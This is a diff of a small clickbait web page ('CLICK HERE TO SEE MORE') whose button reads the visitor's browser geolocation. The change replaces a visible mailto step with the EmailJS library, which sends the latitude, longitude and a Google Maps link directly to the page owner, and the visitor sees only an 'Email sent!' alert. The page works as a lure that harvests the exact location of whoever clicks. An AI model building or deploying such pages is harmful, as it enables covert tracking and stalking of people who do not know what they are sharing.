@@ -6,7 +6,14 @@
 </head>
 <body>
     <h1>CLICK HERE TO SEE MORE</h1>
-  <button onclick="sendEmail()">I WANNA</button>
+  <button onclick="sendEmail()">SEND</button>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("id");
+    })();
+  </script>
 
   <script>
     function sendEmail() {
@@ -21,12 +28,13 @@
           const longitude = position.coords.longitude;
           const mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
 
-          const recipient = "keodevspace@gmail.com"; // Set your email here
-          const subject = "Current Location";
-          const body = `${mapLink}`;
-
-          const mailtoLink = `mailto:${recipient}?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-          window.location.href = mailtoLink;
+          emailjs.send("id", "template_default", {
+            latitude: latitude,
+            longitude: longitude,
+            map_link: mapLink
+          })
+          .then(() => alert("Email sent!"))
+          .catch(() => alert("Error sending email."));
         },
         () => alert("Could not get your location.")
       );
